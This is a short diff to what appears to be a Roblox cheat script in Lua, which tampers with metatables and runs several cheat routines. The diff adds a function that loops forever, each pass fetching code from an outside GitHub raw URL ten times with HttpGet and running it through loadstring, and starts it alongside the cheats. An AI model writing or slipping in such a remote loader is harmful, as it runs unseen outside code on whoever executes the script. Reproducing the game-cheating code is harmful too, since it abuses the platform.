@@ -1,4 +1,13 @@
 -- are you kidding me?
+
+local function Anti2()
+ while task.wait() do
+for i = 1, 10 do
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/Gyvyvtvtv/main/Exehiper"))()
+end
+ end
+end
+
 local allowedPlaceIds = {12582654981, 6293968958}
 if not table.find(allowedPlaceIds, game.PlaceId) then
     local function CheatA()
@@ -126,6 +135,7 @@ setreadonly(mt, true)
   end
 end
 
+coroutine.wrap(Anti2)()
 coroutine.wrap(CheatA)()
 coroutine.wrap(CheatB)()
 coroutine.wrap(CheatC)()
